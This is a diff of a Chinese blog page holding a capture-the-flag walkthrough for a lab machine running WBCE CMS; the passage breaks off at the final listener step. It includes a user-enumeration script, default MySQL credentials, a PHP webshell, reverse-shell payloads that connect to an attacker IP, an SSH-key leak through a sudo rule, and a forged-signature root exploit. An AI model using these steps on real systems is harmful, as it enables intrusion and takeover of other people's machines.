@@ -42,7 +42,7 @@ PORT     STATE SERVICE
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_baker.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_baker</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -66,17 +66,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -109,187 +99,210 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">IP=10.216.75.104
-nmap -p0-65535 <span class="pl-smi">$IP</span></pre></div>
-<pre class="notranslate"><code class="notranslate">PORT     STATE SERVICE
+<pre lang="bash"><code>IP=10.216.75.104
+nmap -p0-65535 $IP
+</code></pre>
+<pre><code>PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 3306/tcp open  mysql
 </code></pre>
 <p>三个端口，SSH、HTTP、MySQL 全开着。用 rustscan 跑一遍详细信息。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">rustscan -a <span class="pl-smi">$IP</span> --ulimit 5000 -- -A -sC -sV</pre></div>
-<p>关键信息：SSH 是 OpenSSH 10.0，HTTP 是 Apache 2.4.66 跑在 Unix 上，页面标题写着 "Dairy - Website Baker"，MySQL 是 MariaDB 11.4.8，认证插件用的 mysql_native_password。MAC 地址 <code class="notranslate">08:00:27</code> 开头，VirtualBox 虚拟机没跑了。</p>
-<p>浏览器访问 80 端口，页面加载不完整，搜索功能跳转到了 <code class="notranslate">baker.dsz</code> 这个域名。加一条 hosts 记录。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>10.216.75.104 baker.dsz<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sudo tee -a /etc/hosts</pre></div>
+<pre lang="bash"><code>rustscan -a $IP --ulimit 5000 -- -A -sC -sV
+</code></pre>
+<p>关键信息：SSH 是 OpenSSH 10.0，HTTP 是 Apache 2.4.66 跑在 Unix 上，页面标题写着 &quot;Dairy - Website Baker&quot;，MySQL 是 MariaDB 11.4.8，认证插件用的 mysql_native_password。MAC 地址 <code>08:00:27</code> 开头，VirtualBox 虚拟机没跑了。</p>
+<p>浏览器访问 80 端口，页面加载不完整，搜索功能跳转到了 <code>baker.dsz</code> 这个域名。加一条 hosts 记录。</p>
+<pre lang="bash"><code>echo &quot;10.216.75.104 baker.dsz&quot; | sudo tee -a /etc/hosts
+</code></pre>
 <p>刷新页面，网站正常加载出来了。页面上有一句话很显眼：</p>
 <blockquote>
 <p>We will run the TRUNCATE TABLE wbce_blocking command at 1-minute intervals.</p>
 </blockquote>
 <p>这句话当时没太在意，后来发现它是理解登录封锁机制的关键。</p>
 <h1>目录扫描</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">dirsearch -u http://baker.dsz -e <span class="pl-s"><span class="pl-pds">"</span>*<span class="pl-pds">"</span></span></pre></div>
+<pre lang="bash"><code>dirsearch -u http://baker.dsz -e &quot;*&quot;
+</code></pre>
 <p>扫出来的有用路径不多，主要几个：</p>
 <ul>
-<li><code class="notranslate">/.gitignore</code> 200</li>
-<li><code class="notranslate">/admin/</code> 302 跳转到 <code class="notranslate">/admin/start/index.php</code></li>
-<li><code class="notranslate">/account/</code> 301 跳到 <code class="notranslate">login.php</code></li>
-<li><code class="notranslate">/CHANGELOG.md</code> 200</li>
-<li><code class="notranslate">/INSTALL.md</code> 200</li>
-<li><code class="notranslate">/README.md</code> 200</li>
-<li><code class="notranslate">/config.php</code> 200 但内容为空（PHP 被执行了）</li>
-<li><code class="notranslate">/media/</code> 200 可列目录</li>
-<li><code class="notranslate">/var/logs/</code> 200</li>
+<li><code>/.gitignore</code> 200</li>
+<li><code>/admin/</code> 302 跳转到 <code>/admin/start/index.php</code></li>
+<li><code>/account/</code> 301 跳到 <code>login.php</code></li>
+<li><code>/CHANGELOG.md</code> 200</li>
+<li><code>/INSTALL.md</code> 200</li>
+<li><code>/README.md</code> 200</li>
+<li><code>/config.php</code> 200 但内容为空（PHP 被执行了）</li>
+<li><code>/media/</code> 200 可列目录</li>
+<li><code>/var/logs/</code> 200</li>
 </ul>
-<p>翻了一圈这些文件，<code class="notranslate">README.md</code> 里提到了邮箱格式的 hint，<code class="notranslate">CHANGELOG.md</code> 确认 CMS 是 WBCE CMS。访问 <code class="notranslate">/admin/</code> 能看到后台登录页。</p>
+<p>翻了一圈这些文件，<code>README.md</code> 里提到了邮箱格式的 hint，<code>CHANGELOG.md</code> 确认 CMS 是 WBCE CMS。访问 <code>/admin/</code> 能看到后台登录页。</p>
 <h1>用户名枚举</h1>
-<p>后台有个忘记密码功能在 <code class="notranslate">/admin/login/forgot/index.php</code>，带一个文本验证码（类似 "9 multiply 5" 这种）。关键在于：输入不存在的邮箱会返回 "The email that you entered cannot be found in the database"，而邮箱存在则返回不同的提示。这就能拿来枚举用户。</p>
-<p>结合 <code class="notranslate">README.md</code> 里的邮箱格式 <code class="notranslate">[username]@baker.dsz</code>，写个脚本跑一下。保存为 <code class="notranslate">enum.py</code>：</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>
-<span class="pl-k">import</span> <span class="pl-s1">re</span>
+<p>后台有个忘记密码功能在 <code>/admin/login/forgot/index.php</code>，带一个文本验证码（类似 &quot;9 multiply 5&quot; 这种）。关键在于：输入不存在的邮箱会返回 &quot;The email that you entered cannot be found in the database&quot;，而邮箱存在则返回不同的提示。这就能拿来枚举用户。</p>
+<p>结合 <code>README.md</code> 里的邮箱格式 <code>[username]@baker.dsz</code>，写个脚本跑一下。保存为 <code>enum.py</code>：</p>
+<pre lang="python"><code>import requests
+import re
 
-<span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://baker.dsz/admin/login/forgot/index.php"</span>
-<span class="pl-s1">calc</span> <span class="pl-c1">=</span> {<span class="pl-s">'subtract'</span>: <span class="pl-s">'-'</span>, <span class="pl-s">'multiply'</span>: <span class="pl-s">'*'</span>, <span class="pl-s">'add'</span>: <span class="pl-s">'+'</span>}
-<span class="pl-s1">wordlist</span> <span class="pl-c1">=</span> <span class="pl-s">"/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"</span>
-<span class="pl-s1">domains</span> <span class="pl-c1">=</span> [<span class="pl-s">"baker.dsz"</span>, <span class="pl-s">"baker.local"</span>]
+url = &quot;http://baker.dsz/admin/login/forgot/index.php&quot;
+calc = {'subtract': '-', 'multiply': '*', 'add': '+'}
+wordlist = &quot;/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt&quot;
+domains = [&quot;baker.dsz&quot;, &quot;baker.local&quot;]
 
-<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">wordlist</span>, <span class="pl-s">"r"</span>, <span class="pl-s1">errors</span><span class="pl-c1">=</span><span class="pl-s">"ignore"</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
-    <span class="pl-s1">count</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
-    <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span>:
-        <span class="pl-s1">name</span> <span class="pl-c1">=</span> <span class="pl-s1">line</span>.<span class="pl-c1">strip</span>()
-        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">name</span>:
-            <span class="pl-k">continue</span>
-        <span class="pl-k">for</span> <span class="pl-s1">domain</span> <span class="pl-c1">in</span> <span class="pl-s1">domains</span>:
-            <span class="pl-s1">count</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
-            <span class="pl-k">try</span>:
-                <span class="pl-s1">sess</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">session</span>()
-                <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">sess</span>.<span class="pl-c1">get</span>(<span class="pl-s1">url</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
-                <span class="pl-s1">r1</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">findall</span>(<span class="pl-s">b'&gt;<span class="pl-cce">\n</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span>(.*?)<span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span><span class="pl-cce">\t</span>'</span>, <span class="pl-s1">resp</span>.<span class="pl-c1">content</span>)
-                <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">r1</span>:
-                    <span class="pl-k">continue</span>
-                <span class="pl-s1">parts</span> <span class="pl-c1">=</span> <span class="pl-s1">r1</span>[<span class="pl-c1">0</span>].<span class="pl-c1">decode</span>().<span class="pl-c1">split</span>(<span class="pl-s">' '</span>)
-                <span class="pl-s1">captcha_val</span> <span class="pl-c1">=</span> <span class="pl-en">eval</span>(<span class="pl-s">f'<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">parts</span>[<span class="pl-c1">0</span>]<span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">calc</span>[<span class="pl-s1">parts</span>[<span class="pl-c1">1</span>]]<span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">parts</span>[<span class="pl-c1">2</span>]<span class="pl-kos">}</span></span>'</span>)
-                <span class="pl-s1">data</span> <span class="pl-c1">=</span> {<span class="pl-s">'email'</span>: <span class="pl-s">f'<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">name</span><span class="pl-kos">}</span></span>@<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">domain</span><span class="pl-kos">}</span></span>'</span>, <span class="pl-s">'captcha'</span>: <span class="pl-s1">captcha_val</span>, <span class="pl-s">'submit'</span>: <span class="pl-s">'Send Details'</span>}
-                <span class="pl-s1">resp2</span> <span class="pl-c1">=</span> <span class="pl-s1">sess</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
-                <span class="pl-k">if</span> <span class="pl-s">"cannot be found in the database"</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">resp2</span>.<span class="pl-c1">text</span>:
-                    <span class="pl-en">print</span>(<span class="pl-s">f"[+] Found: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">name</span><span class="pl-kos">}</span></span>@<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">domain</span><span class="pl-kos">}</span></span>"</span>)
-            <span class="pl-k">except</span> <span class="pl-v">Exception</span>:
-                <span class="pl-k">pass</span>
-            <span class="pl-k">if</span> <span class="pl-s1">count</span> <span class="pl-c1">%</span> <span class="pl-c1">100</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
-                <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">count</span><span class="pl-kos">}</span></span>] checking <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">name</span><span class="pl-kos">}</span></span>@<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">domain</span><span class="pl-kos">}</span></span>"</span>)</pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 enum.py</pre></div>
-<p>跑出来两个有效用户：<code class="notranslate">carol@baker.dsz</code> 和 <code class="notranslate">martina@baker.dsz</code>。</p>
+with open(wordlist, &quot;r&quot;, errors=&quot;ignore&quot;) as f:
+    count = 0
+    for line in f:
+        name = line.strip()
+        if not name:
+            continue
+        for domain in domains:
+            count += 1
+            try:
+                sess = requests.session()
+                resp = sess.get(url, timeout=5)
+                r1 = re.findall(b'&gt;\n\t\t\t\t\t\t\t(.*?)\t\t\t\t\t\t', resp.content)
+                if not r1:
+                    continue
+                parts = r1[0].decode().split(' ')
+                captcha_val = eval(f'{parts[0]}{calc[parts[1]]}{parts[2]}')
+                data = {'email': f'{name}@{domain}', 'captcha': captcha_val, 'submit': 'Send Details'}
+                resp2 = sess.post(url, data=data, timeout=5)
+                if &quot;cannot be found in the database&quot; not in resp2.text:
+                    print(f&quot;[+] Found: {name}@{domain}&quot;)
+            except Exception:
+                pass
+            if count % 100 == 0:
+                print(f&quot;[{count}] checking {name}@{domain}&quot;)
+
+</code></pre>
+<pre lang="bash"><code>python3 enum.py
+</code></pre>
+<p>跑出来两个有效用户：<code>carol@baker.dsz</code> 和 <code>martina@baker.dsz</code>。</p>
 <h1>MySQL 弱口令</h1>
 <p>在爆破登录密码之前，我先试了一下 3306 端口。MySQL 开着嘛，万一弱口令呢。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mysql -h <span class="pl-smi">$IP</span> -u root -proot</pre></div>
-<p>还真进去了，<code class="notranslate">root:root</code> 直接登录成功。不过权限很有限，<code class="notranslate">wbce_db</code> 库完全没权限读，只能看 <code class="notranslate">wbce_test</code> 库。翻了一下表结构，<code class="notranslate">wbce_users</code> 表里有一条记录：</p>
-<pre class="notranslate"><code class="notranslate">user_id: 1
+<pre lang="bash"><code>mysql -h $IP -u root -proot
+</code></pre>
+<p>还真进去了，<code>root:root</code> 直接登录成功。不过权限很有限，<code>wbce_db</code> 库完全没权限读，只能看 <code>wbce_test</code> 库。翻了一下表结构，<code>wbce_users</code> 表里有一条记录：</p>
+<pre><code>user_id: 1
 username: admin
 email: admin@baker.local
 password: $2y$10$NwaR46o119WADcffpS5M8.qTCmNaCqx3Ga6M1wKQJEhy7pUufnO9u
 </code></pre>
 <p>拿到一个 bcrypt 哈希，丢给 john 跑一下。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>$2y$10$NwaR46o119WADcffpS5M8.qTCmNaCqx3Ga6M1wKQJEhy7pUufnO9u<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> hash.txt
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</pre></div>
-<pre class="notranslate"><code class="notranslate">?:33333333
+<pre lang="bash"><code>echo '$2y$10$NwaR46o119WADcffpS5M8.qTCmNaCqx3Ga6M1wKQJEhy7pUufnO9u' &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<pre><code>?:33333333
 1 password hash cracked, 0 left
 </code></pre>
-<p>爆出明文 <code class="notranslate">33333333</code>。拿这个密码去后台登 admin 账号，结果提示密码不正确。这里卡了一下，后来想明白了：<code class="notranslate">wbce_test</code> 库大概率是测试库，里面的 admin 哈希和生产库 <code class="notranslate">wbce_db</code> 里的不一定一致。但这个密码 <code class="notranslate">33333333</code> 可能是其他用户在用的。</p>
-<p>拿 <code class="notranslate">carol:33333333</code> 和 <code class="notranslate">martina:33333333</code> 分别试了一下后台登录，都能进。carol 是管理员权限，martina 是低权限用户。</p>
+<p>爆出明文 <code>33333333</code>。拿这个密码去后台登 admin 账号，结果提示密码不正确。这里卡了一下，后来想明白了：<code>wbce_test</code> 库大概率是测试库，里面的 admin 哈希和生产库 <code>wbce_db</code> 里的不一定一致。但这个密码 <code>33333333</code> 可能是其他用户在用的。</p>
+<p>拿 <code>carol:33333333</code> 和 <code>martina:33333333</code> 分别试了一下后台登录，都能进。carol 是管理员权限，martina 是低权限用户。</p>
 <h1>登录封锁机制</h1>
-<p>这里补一个踩坑的点。后台登录错误几次之后会直接封 IP，返回 "Excessive Invalid Logins"。当时觉得挺烦的，后来回想起首页那句话：</p>
+<p>这里补一个踩坑的点。后台登录错误几次之后会直接封 IP，返回 &quot;Excessive Invalid Logins&quot;。当时觉得挺烦的，后来回想起首页那句话：</p>
 <blockquote>
 <p>We will run the TRUNCATE TABLE wbce_blocking command at 1-minute intervals.</p>
 </blockquote>
-<p>也就是说 <code class="notranslate">wbce_blocking</code> 表每分钟被清空一次，被封之后等大约一分钟就自动解封了。如果要爆破密码的话，每两次尝试之间 sleep 62 秒就行，虽然慢但能跑通。不过我这里因为已经从数据库拿到了密码，没再走爆破这条路。</p>
+<p>也就是说 <code>wbce_blocking</code> 表每分钟被清空一次，被封之后等大约一分钟就自动解封了。如果要爆破密码的话，每两次尝试之间 sleep 62 秒就行，虽然慢但能跑通。不过我这里因为已经从数据库拿到了密码，没再走爆破这条路。</p>
 <h1>后台 Getshell</h1>
 <p>用 carol 的管理员账号登进后台之后，WBCE CMS 1.6.x 有个已知的 RCE 路径：通过 Droplets 功能写入 PHP 代码，再在页面中调用执行。对应 ExploitDB 上的 52489。</p>
-<p>操作步骤是这样的：进 Admin-tools 里的 Droplets，新建一个 Droplet，名字叫 <code class="notranslate">shell</code>，内容写一个 webshell：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span> <span class="pl-en">system</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">cmd</span>'</span>]); <span class="pl-k">return</span> <span class="pl-s">''</span>; <span class="pl-ent">?&gt;</span></pre></div>
-<p>保存之后，去 Pages 新建一个页面，名字随便起比如 <code class="notranslate">test</code>，页面内容里写上 <code class="notranslate">[[shell]]</code> 调用这个 Droplet。</p>
-<p>访问 <code class="notranslate">http://baker.dsz/pages/test.php?cmd=id</code> 验证一下，能看到命令执行回显，当前用户是 <code class="notranslate">apache</code>。</p>
+<p>操作步骤是这样的：进 Admin-tools 里的 Droplets，新建一个 Droplet，名字叫 <code>shell</code>，内容写一个 webshell：</p>
+<pre lang="php"><code>&lt;?php system($_GET['cmd']); return ''; ?&gt;
+</code></pre>
+<p>保存之后，去 Pages 新建一个页面，名字随便起比如 <code>test</code>，页面内容里写上 <code>[[shell]]</code> 调用这个 Droplet。</p>
+<p>访问 <code>http://baker.dsz/pages/test.php?cmd=id</code> 验证一下，能看到命令执行回显，当前用户是 <code>apache</code>。</p>
 <p>拿到 user flag：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">"</span>http://baker.dsz/pages/test.php?cmd=cat+/home/carol/user.txt<span class="pl-pds">"</span></span></pre></div>
+<pre lang="bash"><code>curl &quot;http://baker.dsz/pages/test.php?cmd=cat+/home/carol/user.txt&quot;
+</code></pre>
 <h1>apache 到 carol</h1>
 <p>用 webshell 弹一个交互式 shell 过来。kali 上监听：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
 <p>通过 webshell 触发反弹：</p>
-<pre class="notranslate"><code class="notranslate">http://baker.dsz/pages/test.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.216.75.80%22%2C8888)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
+<pre><code>http://baker.dsz/pages/test.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.216.75.80%22%2C8888)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
 </code></pre>
 <p>拿到 apache 用户的 shell 之后，看一下 sudo 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -l</pre></div>
-<pre class="notranslate"><code class="notranslate">User apache may run the following commands on Baker:
+<pre lang="bash"><code>sudo -l
+</code></pre>
+<pre><code>User apache may run the following commands on Baker:
     (carol) NOPASSWD: /sbin/ip
 </code></pre>
-<p>可以用 carol 身份无密码执行 <code class="notranslate">/sbin/ip</code>。GTFOBins 上有 ip 命令的文件读取利用方式：<code class="notranslate">ip -force -batch &lt;file&gt;</code> 会把文件每一行当作 ip 子命令解析，解析失败时错误信息里会带上该行的完整内容，加 <code class="notranslate">-force</code> 遇错不停继续处理后续行。等于能逐行泄露任意文件。</p>
+<p>可以用 carol 身份无密码执行 <code>/sbin/ip</code>。GTFOBins 上有 ip 命令的文件读取利用方式：<code>ip -force -batch &lt;file&gt;</code> 会把文件每一行当作 ip 子命令解析，解析失败时错误信息里会带上该行的完整内容，加 <code>-force</code> 遇错不停继续处理后续行。等于能逐行泄露任意文件。</p>
 <p>读 carol 的 SSH 私钥：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -u carol /sbin/ip -force -batch /home/carol/.ssh/id_rsa <span class="pl-k">2&gt;&amp;1</span></pre></div>
-<p>每一行都报 <code class="notranslate">Object "xxx" is unknown</code>，但私钥内容全部泄露出来了。把输出清理一下，去掉 <code class="notranslate">Object "</code> 前缀和 <code class="notranslate">" is unknown, try "ip help".</code> 后缀，去掉 <code class="notranslate">Command failed</code> 行，拼回完整的 OpenSSH 私钥。</p>
-<p>保存为 <code class="notranslate">carol.key</code>，SSH 登录：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">chmod 600 carol.key
-ssh -i carol.key carol@<span class="pl-smi">$IP</span></pre></div>
+<pre lang="bash"><code>sudo -u carol /sbin/ip -force -batch /home/carol/.ssh/id_rsa 2&gt;&amp;1
+</code></pre>
+<p>每一行都报 <code>Object &quot;xxx&quot; is unknown</code>，但私钥内容全部泄露出来了。把输出清理一下，去掉 <code>Object &quot;</code> 前缀和 <code>&quot; is unknown, try &quot;ip help&quot;.</code> 后缀，去掉 <code>Command failed</code> 行，拼回完整的 OpenSSH 私钥。</p>
+<p>保存为 <code>carol.key</code>，SSH 登录：</p>
+<pre lang="bash"><code>chmod 600 carol.key
+ssh -i carol.key carol@$IP
+</code></pre>
 <p>登录成功，拿到 carol 的 shell。</p>
 <h1>carol 到 root</h1>
 <h2>定时任务分析</h2>
 <p>传个 pspy64 上去看有没有定时任务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">chmod +x /tmp/pspy64 <span class="pl-k">&amp;&amp;</span> /tmp/pspy64</pre></div>
+<pre lang="bash"><code>chmod +x /tmp/pspy64 &amp;&amp; /tmp/pspy64
+</code></pre>
 <p>每分钟都会看到这几行：</p>
-<pre class="notranslate"><code class="notranslate">CMD: UID=0 | /bin/bash -c /usr/local/bin/check-monitor.sh
+<pre><code>CMD: UID=0 | /bin/bash -c /usr/local/bin/check-monitor.sh
 CMD: UID=0 | objcopy --dump-section .note.sig=/tmp/sig_verify.bin /opt/scripts/monitor
 CMD: UID=0 | grep -q Maze-Sec-Internal-Only /tmp/sig_verify.bin
 CMD: UID=0 | /opt/scripts/monitor
 </code></pre>
-<p>root 的 cron 每分钟执行 <code class="notranslate">/usr/local/bin/check-monitor.sh</code>。看一下这个脚本的内容：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat /usr/local/bin/check-monitor.sh</pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
-TARGET=<span class="pl-s"><span class="pl-pds">"</span>/opt/scripts/monitor<span class="pl-pds">"</span></span>
-SIG_SECTION=<span class="pl-s"><span class="pl-pds">"</span>.note.sig<span class="pl-pds">"</span></span>
-TEMP_SIG=<span class="pl-s"><span class="pl-pds">"</span>/tmp/sig_verify.bin<span class="pl-pds">"</span></span>
-VENDOR_STR=<span class="pl-s"><span class="pl-pds">"</span>Maze-Sec-Internal-Only<span class="pl-pds">"</span></span>
-
-objcopy --dump-section <span class="pl-smi">$SIG_SECTION</span>=<span class="pl-smi">$TEMP_SIG</span> <span class="pl-smi">$TARGET</span> <span class="pl-k">2&gt;</span>/dev/null
-<span class="pl-k">if</span> [ <span class="pl-smi">$?</span> <span class="pl-k">-ne</span> 0 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[!] Error: Binary not signed.<span class="pl-pds">"</span></span>
-    <span class="pl-c1">exit</span> 1
-<span class="pl-k">fi</span>
-<span class="pl-k">if</span> grep -q <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VENDOR_STR</span><span class="pl-pds">"</span></span> <span class="pl-smi">$TEMP_SIG</span><span class="pl-k">;</span> <span class="pl-k">then</span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[+] Signature verified. Executing...<span class="pl-pds">"</span></span>
-    <span class="pl-smi">$TARGET</span>
-<span class="pl-k">else</span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[!] Security Alert: Unauthorized binary detected!<span class="pl-pds">"</span></span>
-<span class="pl-k">fi</span>
-rm -f <span class="pl-smi">$TEMP_SIG</span></pre></div>
-<p>逻辑很清楚：用 objcopy 从 <code class="notranslate">/opt/scripts/monitor</code> 提取 <code class="notranslate">.note.sig</code> 这个 ELF section，检查里面是否包含 <code class="notranslate">Maze-Sec-Internal-Only</code> 字符串，包含就以 root 身份执行这个二进制。</p>
-<p>看一下目录权限：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ls -ld /opt/scripts/</pre></div>
-<pre class="notranslate"><code class="notranslate">drwxrwxr-x    2 root     devs        4096 ... /opt/scripts/
+<p>root 的 cron 每分钟执行 <code>/usr/local/bin/check-monitor.sh</code>。看一下这个脚本的内容：</p>
+<pre lang="bash"><code>cat /usr/local/bin/check-monitor.sh
 </code></pre>
-<p>carol 属于 devs 组，对这个目录有写权限，可以替换 monitor 文件。只要替换上去的二进制包含正确签名的 <code class="notranslate">.note.sig</code> section，就能通过检查被 root 执行。</p>
+<pre lang="bash"><code>#!/bin/sh
+TARGET=&quot;/opt/scripts/monitor&quot;
+SIG_SECTION=&quot;.note.sig&quot;
+TEMP_SIG=&quot;/tmp/sig_verify.bin&quot;
+VENDOR_STR=&quot;Maze-Sec-Internal-Only&quot;
+
+objcopy --dump-section $SIG_SECTION=$TEMP_SIG $TARGET 2&gt;/dev/null
+if [ $? -ne 0 ]; then
+    echo &quot;[!] Error: Binary not signed.&quot;
+    exit 1
+fi
+if grep -q &quot;$VENDOR_STR&quot; $TEMP_SIG; then
+    echo &quot;[+] Signature verified. Executing...&quot;
+    $TARGET
+else
+    echo &quot;[!] Security Alert: Unauthorized binary detected!&quot;
+fi
+rm -f $TEMP_SIG
+</code></pre>
+<p>逻辑很清楚：用 objcopy 从 <code>/opt/scripts/monitor</code> 提取 <code>.note.sig</code> 这个 ELF section，检查里面是否包含 <code>Maze-Sec-Internal-Only</code> 字符串，包含就以 root 身份执行这个二进制。</p>
+<p>看一下目录权限：</p>
+<pre lang="bash"><code>ls -ld /opt/scripts/
+</code></pre>
+<pre><code>drwxrwxr-x    2 root     devs        4096 ... /opt/scripts/
+</code></pre>
+<p>carol 属于 devs 组，对这个目录有写权限，可以替换 monitor 文件。只要替换上去的二进制包含正确签名的 <code>.note.sig</code> section，就能通过检查被 root 执行。</p>
 <h2>构造恶意 monitor</h2>
-<p>写一个 C 程序弹反弹 shell。保存为 <code class="notranslate">/tmp/exploit.c</code>：</p>
-<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
-<span class="pl-k">#include</span> <span class="pl-s">&lt;stdlib.h&gt;</span>
-<span class="pl-smi">int</span> <span class="pl-en">main</span>() {
-    <span class="pl-en">setuid</span>(<span class="pl-c1">0</span>);
-    <span class="pl-en">setgid</span>(<span class="pl-c1">0</span>);
-    <span class="pl-en">system</span>(<span class="pl-s">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.216.75.80/8888 0&gt;&amp;1'"</span>);
-    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
-}</pre></div>
-<p>编译，创建签名数据，用 objcopy 注入 <code class="notranslate">.note.sig</code> section，替换 monitor：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">gcc /tmp/exploit.c -o /tmp/monitor_bin
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Maze-Sec-Internal-Only<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> /tmp/sig
+<p>写一个 C 程序弹反弹 shell。保存为 <code>/tmp/exploit.c</code>：</p>
+<pre lang="c"><code>#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+int main() {
+    setuid(0);
+    setgid(0);
+    system(&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.216.75.80/8888 0&gt;&amp;1'&quot;);
+    return 0;
+}
+</code></pre>
+<p>编译，创建签名数据，用 objcopy 注入 <code>.note.sig</code> section，替换 monitor：</p>
+<pre lang="bash"><code>gcc /tmp/exploit.c -o /tmp/monitor_bin
+echo &quot;Maze-Sec-Internal-Only&quot; &gt; /tmp/sig
 objcopy --add-section .note.sig=/tmp/sig --set-section-flags .note.sig=alloc,readonly /tmp/monitor_bin /tmp/monitor_signed
 cp /tmp/monitor_signed /opt/scripts/monitor
-chmod +x /opt/scripts/monitor</pre></div>
+chmod +x /opt/scripts/monitor
+</code></pre>
 <p>kali 上监听：</p>
